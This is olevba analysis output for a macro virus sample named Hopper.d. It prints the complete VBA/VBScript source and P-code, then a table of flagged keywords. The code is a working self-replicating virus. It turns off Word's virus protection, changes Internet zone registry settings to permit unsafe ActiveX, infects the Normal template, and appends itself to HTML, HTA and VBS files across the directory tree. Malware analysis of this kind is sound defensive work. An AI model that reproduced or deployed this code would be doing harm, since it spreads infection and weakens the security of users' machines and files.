olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hopper.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Hopper.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<html> <!--1nternal-->
'<head>
'<meta http-equiv="Content-Type"
'content="text/html; charset=iso-8859-1">
'<meta name="Author" content="1nternal">
'</head>
'<BODY>
'<script language="VBScript"><!--
'On Error Resume Next
'HostType = "VBS"
'HostPath = WScript.ScriptFullName
'Call InfWord
'Call FindHTMVBS
'Set WSHell = CreateObject("Wscript.Shell")
'WSHell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
'WSHell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"

Private FSO, NT, HostType, InfType, HostPath, Target, Tempfile

Private Sub FindHTMVBS()
        Set FSO = CreateObject("Scripting.FileSystemObject")
        cpath = FSO.GetParentFolderName(HostPath)
        Set folder = FSO.GetFolder(cpath)
        While folder.IsRootFolder = False
                Set folder = FSO.GetFolder(cpath)
                Set fc = folder.Files
                cpath = FSO.GetParentFolderName(cpath)
                For Each Target In fc
                        InfType = LCase(FSO.GetExtensionName(Target.Name))
                        If InfType = "html" Or InfType = "htt" Or InfType = "hta" Then InfType = "htm"
                        If InfType = "htm" Or InfType = "vbs" And Target.Path <> HostPath Then
                                Set fh = FSO.opentextfile(Target.Path, 1, True)
                                TestString = fh.ReadLine
                                fh.Close
                                If TestString <> "<html> <!--1nternal-->" And TestString <> "'<html> <!--1nternal-->" Then
                                        Call DoFile
                                End If
                        End If
                Next
        Wend
End Sub

Private Sub InfWord()
        On Error Resume Next
        Set WordObj = CreateObject("Word.Application")
        Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
        If NT.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                WordObj.Options.SaveNormalPrompt = False
                NT.DeleteLines 1, NT.CountOfLines
                NT.AddFromFile HostPath
                NT.DeleteLines 180, (NT.CountOfLines - 179)
                If HostType = "HTM" Then
                        For j = 1 To 9
                                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
                        Next
                        For j = 177 To 179
                                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
                        Next
                Else
                        For j = 9 To 16
                                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
                        Next
                End If
        End If
        Set NT = Nothing
        WordObj.Quit
End Sub

Private Sub Window_Onload()
        Randomize
        On Error Resume Next
        If Location.protocol = "file:" And (Int((6 * Rnd) + 1) = 1) Then
                Dim FSO, folder, fc, f1, cpath
                Set FSO = CreateObject("Scripting.FileSystemObject")
                HostPath = Replace(Location.href, "file:///", "")
                HostPath = Replace(HostPath, "/", "\")
                HostType = "HTM"
                Call InfWord
                Call FindHTMVBS
                Set WSHell = CreateObject("WScript.Shell")
                WSHell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
                WSHell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
                If (Int((5 * Rnd) + 1) = 1) Then Window.Status = "ActiveX.Hybrid v0.51 /1nternal"
        End If
End Sub

Private Sub Document_Close()
        On Error Resume Next
        Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
        Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
        Options.VirusProtection = False
        Options.ConfirmConversions = False
        Options.SaveNormalPrompt = False
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "1201") = ""
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "1201") = ""
        If NT.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                For i = 1 To 179
                        NT.InsertLines i, AD.Lines(i, 1)
                Next
        End If
        If AD.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                For i = 1 To 179
                        AD.InsertLines i, NT.Lines(i, 1)
                Next
        End If
        HostType = "DOC"
        HostPath = "C:\Windows\Web\Afile.htm"
        If (Int((15 * Rnd) + 1) = 1) Then Call FindHTMVBS
End Sub

Private Sub DoFileFromFile()
        Set fh = FSO.opentextfile(HostPath, 1, True)
        Set ft = FSO.opentextfile(Target.Path, 2, True)
        For j = 1 To 179
                NextLine = fh.ReadLine
                If HostType = "HTM" Then
                        If InfType = "vbs" Then
                                If j < 9 Or j > 176 Then
                                        NextLine = "'" + NextLine
                                End If
                                If j > 8 And j < 17 Then
                                        NextLine = Mid(NextLine, 2)
                                End If
                        End If
                Else
                        If InfType = "htm" Then
                                If j < 9 Or j > 176 Then
                                        NextLine = Mid(NextLine, 2)
                                End If
                                If j > 8 And j < 17 Then
                                        NextLine = "'" + NextLine
                                End If
                        End If
                End If
                ft.WriteLine NextLine
        Next
        fh.Close
        ft.Close
End Sub

Private Sub DoFileFromDoc()
        Set ft = FSO.opentextfile(Target.Path, 2, True)
        For j = 1 To 179
                NextLine = NT.Lines(j, 1)
                If InfType = "htm" Then
                        If j < 9 Or j > 176 Then
                                NextLine = Mid(NextLine, 2)
                        End If
                Else
                        If j > 8 And j < 17 Then
                                NextLine = Mid(NextLine, 2)
                        End If
                End If
                ft.WriteLine NextLine
        Next
        ft.Close
End Sub

Private Sub DoFile()
        Tempfile = FSO.GetTempName
        FSO.CopyFile Target.Path, Tempfile
        If HostType = "DOC" Then
                Call DoFileFromDoc
        Else
                Call DoFileFromFile
        End If
        Set fh = FSO.opentextfile(Tempfile, 1, True)
        Set ft = FSO.opentextfile(Target.Path, 8, True)
        Do While fh.AtEndOfStream <> True
                ft.WriteLine fh.ReadLine
        Loop
        ft.Close
        fh.Close
        FSO.DeleteFile Tempfile
End Sub

'--></script>
'</BODY>
'</HTML>
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Hopper.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10783 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0016 "<html> <!--1nternal-->"
' Line #1:
' 	QuoteRem 0x0000 0x0006 "<head>"
' Line #2:
' 	QuoteRem 0x0000 0x001F "<meta http-equiv="Content-Type""
' Line #3:
' 	QuoteRem 0x0000 0x0028 "content="text/html; charset=iso-8859-1">"
' Line #4:
' 	QuoteRem 0x0000 0x0027 "<meta name="Author" content="1nternal">"
' Line #5:
' 	QuoteRem 0x0000 0x0007 "</head>"
' Line #6:
' 	QuoteRem 0x0000 0x0006 "<BODY>"
' Line #7:
' 	QuoteRem 0x0000 0x0020 "<script language="VBScript"><!--"
' Line #8:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #9:
' 	QuoteRem 0x0000 0x0010 "HostType = "VBS""
' Line #10:
' 	QuoteRem 0x0000 0x0021 "HostPath = WScript.ScriptFullName"
' Line #11:
' 	QuoteRem 0x0000 0x000C "Call InfWord"
' Line #12:
' 	QuoteRem 0x0000 0x000F "Call FindHTMVBS"
' Line #13:
' 	QuoteRem 0x0000 0x002A "Set WSHell = CreateObject("Wscript.Shell")"
' Line #14:
' 	QuoteRem 0x0000 0x006F "WSHell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD""
' Line #15:
' 	QuoteRem 0x0000 0x006F "WSHell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD""
' Line #16:
' Line #17:
' 	Dim (Private) 
' 	VarDefn FSO
' 	VarDefn NT
' 	VarDefn HostType
' 	VarDefn InfType
' 	VarDefn HostPath
' 	VarDefn Target
' 	VarDefn Tempfile
' Line #18:
' Line #19:
' 	FuncDefn (Private Sub FindHTMVBS())
' Line #20:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set FSO 
' Line #21:
' 	Ld HostPath 
' 	Ld FSO 
' 	ArgsMemLd GetParentFolderName 0x0001 
' 	St cpath 
' Line #22:
' 	SetStmt 
' 	Ld cpath 
' 	Ld FSO 
' 	ArgsMemLd GetFolder 0x0001 
' 	Set folder 
' Line #23:
' 	Ld folder 
' 	MemLd IsRootFolder 
' 	LitVarSpecial (False)
' 	Eq 
' 	While 
' Line #24:
' 	SetStmt 
' 	Ld cpath 
' 	Ld FSO 
' 	ArgsMemLd GetFolder 0x0001 
' 	Set folder 
' Line #25:
' 	SetStmt 
' 	Ld folder 
' 	MemLd Files 
' 	Set fc 
' Line #26:
' 	Ld cpath 
' 	Ld FSO 
' 	ArgsMemLd GetParentFolderName 0x0001 
' 	St cpath 
' Line #27:
' 	StartForVariable 
' 	Ld Target 
' 	EndForVariable 
' 	Ld fc 
' 	ForEach 
' Line #28:
' 	Ld Target 
' 	MemLd New 
' 	Ld FSO 
' 	ArgsMemLd GetExtensionName 0x0001 
' 	ArgsLd LCase 0x0001 
' 	St InfType 
' Line #29:
' 	Ld InfType 
' 	LitStr 0x0004 "html"
' 	Eq 
' 	Ld InfType 
' 	LitStr 0x0003 "htt"
' 	Eq 
' 	Or 
' 	Ld InfType 
' 	LitStr 0x0003 "hta"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "htm"
' 	St InfType 
' 	EndIf 
' Line #30:
' 	Ld InfType 
' 	LitStr 0x0003 "htm"
' 	Eq 
' 	Ld InfType 
' 	LitStr 0x0003 "vbs"
' 	Eq 
' 	Ld Target 
' 	MemLd Path 
' 	Ld HostPath 
' 	Ne 
' 	And 
' 	Or 
' 	IfBlock 
' Line #31:
' 	SetStmt 
' 	Ld Target 
' 	MemLd Path 
' 	LitDI2 0x0001 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set fh 
' Line #32:
' 	Ld fh 
' 	MemLd ReadLine 
' 	St TestString 
' Line #33:
' 	Ld fh 
' 	ArgsMemCall Close 0x0000 
' Line #34:
' 	Ld TestString 
' 	LitStr 0x0016 "<html> <!--1nternal-->"
' 	Ne 
' 	Ld TestString 
' 	LitStr 0x0017 "'<html> <!--1nternal-->"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #35:
' 	ArgsCall (Call) DoFile 0x0000 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	StartForVariable 
' 	Next 
' Line #39:
' 	Wend 
' Line #40:
' 	EndSub 
' Line #41:
' Line #42:
' 	FuncDefn (Private Sub InfWord())
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #45:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordObj 
' 	ArgsMemLd Templates 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #46:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "'<html> <!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #47:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #49:
' 	Ld HostPath 
' 	Ld NT 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #50:
' 	LitDI2 0x00B4 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	LitDI2 0x00B3 
' 	Sub 
' 	Paren 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #51:
' 	Ld HostType 
' 	LitStr 0x0003 "HTM"
' 	Eq 
' 	IfBlock 
' Line #52:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	For 
' Line #53:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #54:
' 	StartForVariable 
' 	Next 
' Line #55:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x00B1 
' 	LitDI2 0x00B3 
' 	For 
' Line #56:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #57:
' 	StartForVariable 
' 	Next 
' Line #58:
' 	ElseBlock 
' Line #59:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0009 
' 	LitDI2 0x0010 
' 	For 
' Line #60:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #61:
' 	StartForVariable 
' 	Next 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #65:
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' Line #66:
' 	EndSub 
' Line #67:
' Line #68:
' 	FuncDefn (Private Sub Window_Onload())
' Line #69:
' 	ArgsCall Read 0x0000 
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	Ld Location 
' 	MemLd protocol 
' 	LitStr 0x0005 "file:"
' 	Eq 
' 	LitDI2 0x0006 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #72:
' 	Dim 
' 	VarDefn FSO
' 	VarDefn folder
' 	VarDefn fc
' 	VarDefn f1
' 	VarDefn cpath
' Line #73:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set FSO 
' Line #74:
' 	Ld Location 
' 	MemLd href 
' 	LitStr 0x0008 "file:///"
' 	LitStr 0x0000 ""
' 	ArgsLd Replace 0x0003 
' 	St HostPath 
' Line #75:
' 	Ld HostPath 
' 	LitStr 0x0001 "/"
' 	LitStr 0x0001 "\"
' 	ArgsLd Replace 0x0003 
' 	St HostPath 
' Line #76:
' 	LitStr 0x0003 "HTM"
' 	St HostType 
' Line #77:
' 	ArgsCall (Call) InfWord 0x0000 
' Line #78:
' 	ArgsCall (Call) FindHTMVBS 0x0000 
' Line #79:
' 	SetStmt 
' 	LitStr 0x000D "WScript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set WSHell 
' Line #80:
' 	LitStr 0x004D "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201"
' 	LitDI2 0x0000 
' 	LitStr 0x0009 "REG_DWORD"
' 	Ld WSHell 
' 	ArgsMemCall Regwrite 0x0003 
' Line #81:
' 	LitStr 0x004D "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201"
' 	LitDI2 0x0000 
' 	LitStr 0x0009 "REG_DWORD"
' 	Ld WSHell 
' 	ArgsMemCall Regwrite 0x0003 
' Line #82:
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001E "ActiveX.Hybrid v0.51 /1nternal"
' 	Ld Window 
' 	MemSt Status 
' 	EndIf 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	EndSub 
' Line #85:
' Line #86:
' 	FuncDefn (Private Sub Document_Close())
' Line #87:
' 	OnError (Resume Next) 
' Line #88:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #89:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #90:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #91:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #92:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #93:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0055 "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x0004 "1201"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #94:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0056 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x0004 "1201"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #95:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "'<html> <!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #96:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00B3 
' 	For 
' Line #97:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #98:
' 	StartForVariable 
' 	Next 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "'<html> <!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #101:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00B3 
' 	For 
' Line #102:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #103:
' 	StartForVariable 
' 	Next 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	LitStr 0x0003 "DOC"
' 	St HostType 
' Line #106:
' 	LitStr 0x0018 "C:\Windows\Web\Afile.htm"
' 	St HostPath 
' Line #107:
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) FindHTMVBS 0x0000 
' 	EndIf 
' Line #108:
' 	EndSub 
' Line #109:
' Line #110:
' 	FuncDefn (Private Sub DoFileFromFile())
' Line #111:
' 	SetStmt 
' 	Ld HostPath 
' 	LitDI2 0x0001 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set fh 
' Line #112:
' 	SetStmt 
' 	Ld Target 
' 	MemLd Path 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set ft 
' Line #113:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00B3 
' 	For 
' Line #114:
' 	Ld fh 
' 	MemLd ReadLine 
' 	St NextLine 
' Line #115:
' 	Ld HostType 
' 	LitStr 0x0003 "HTM"
' 	Eq 
' 	IfBlock 
' Line #116:
' 	Ld InfType 
' 	LitStr 0x0003 "vbs"
' 	Eq 
' 	IfBlock 
' Line #117:
' 	Ld j 
' 	LitDI2 0x0009 
' 	Lt 
' 	Ld j 
' 	LitDI2 0x00B0 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #118:
' 	LitStr 0x0001 "'"
' 	Ld NextLine 
' 	Add 
' 	St NextLine 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	Ld j 
' 	LitDI2 0x0008 
' 	Gt 
' 	Ld j 
' 	LitDI2 0x0011 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #121:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	ElseBlock 
' Line #125:
' 	Ld InfType 
' 	LitStr 0x0003 "htm"
' 	Eq 
' 	IfBlock 
' Line #126:
' 	Ld j 
' 	LitDI2 0x0009 
' 	Lt 
' 	Ld j 
' 	LitDI2 0x00B0 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #127:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	Ld j 
' 	LitDI2 0x0008 
' 	Gt 
' 	Ld j 
' 	LitDI2 0x0011 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #130:
' 	LitStr 0x0001 "'"
' 	Ld NextLine 
' 	Add 
' 	St NextLine 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	Ld NextLine 
' 	Ld ft 
' 	ArgsMemCall WriteLine 0x0001 
' Line #135:
' 	StartForVariable 
' 	Next 
' Line #136:
' 	Ld fh 
' 	ArgsMemCall Close 0x0000 
' Line #137:
' 	Ld ft 
' 	ArgsMemCall Close 0x0000 
' Line #138:
' 	EndSub 
' Line #139:
' Line #140:
' 	FuncDefn (Private Sub DoFileFromDoc())
' Line #141:
' 	SetStmt 
' 	Ld Target 
' 	MemLd Path 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set ft 
' Line #142:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00B3 
' 	For 
' Line #143:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	St NextLine 
' Line #144:
' 	Ld InfType 
' 	LitStr 0x0003 "htm"
' 	Eq 
' 	IfBlock 
' Line #145:
' 	Ld j 
' 	LitDI2 0x0009 
' 	Lt 
' 	Ld j 
' 	LitDI2 0x00B0 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #146:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	ElseBlock 
' Line #149:
' 	Ld j 
' 	LitDI2 0x0008 
' 	Gt 
' 	Ld j 
' 	LitDI2 0x0011 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #150:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #151:
' 	EndIfBlock 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	Ld NextLine 
' 	Ld ft 
' 	ArgsMemCall WriteLine 0x0001 
' Line #154:
' 	StartForVariable 
' 	Next 
' Line #155:
' 	Ld ft 
' 	ArgsMemCall Close 0x0000 
' Line #156:
' 	EndSub 
' Line #157:
' Line #158:
' 	FuncDefn (Private Sub DoFile())
' Line #159:
' 	Ld FSO 
' 	MemLd GetTempName 
' 	St Tempfile 
' Line #160:
' 	Ld Target 
' 	MemLd Path 
' 	Ld Tempfile 
' 	Ld FSO 
' 	ArgsMemCall CopyFile 0x0002 
' Line #161:
' 	Ld HostType 
' 	LitStr 0x0003 "DOC"
' 	Eq 
' 	IfBlock 
' Line #162:
' 	ArgsCall (Call) DoFileFromDoc 0x0000 
' Line #163:
' 	ElseBlock 
' Line #164:
' 	ArgsCall (Call) DoFileFromFile 0x0000 
' Line #165:
' 	EndIfBlock 
' Line #166:
' 	SetStmt 
' 	Ld Tempfile 
' 	LitDI2 0x0001 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set fh 
' Line #167:
' 	SetStmt 
' 	Ld Target 
' 	MemLd Path 
' 	LitDI2 0x0008 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set ft 
' Line #168:
' 	Ld fh 
' 	MemLd AtEndOfStream 
' 	LitVarSpecial (True)
' 	Ne 
' 	DoWhile 
' Line #169:
' 	Ld fh 
' 	MemLd ReadLine 
' 	Ld ft 
' 	ArgsMemCall WriteLine 0x0001 
' Line #170:
' 	Loop 
' Line #171:
' 	Ld ft 
' 	ArgsMemCall Close 0x0000 
' Line #172:
' 	Ld fh 
' 	ArgsMemCall Close 0x0000 
' Line #173:
' 	Ld Tempfile 
' 	Ld FSO 
' 	ArgsMemCall DeleteFile 0x0001 
' Line #174:
' 	EndSub 
' Line #175:
' Line #176:
' 	QuoteRem 0x0000 0x000C "--></script>"
' Line #177:
' 	QuoteRem 0x0000 0x0007 "</BODY>"
' Line #178:
' 	QuoteRem 0x0000 0x0007 "</HTML>"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

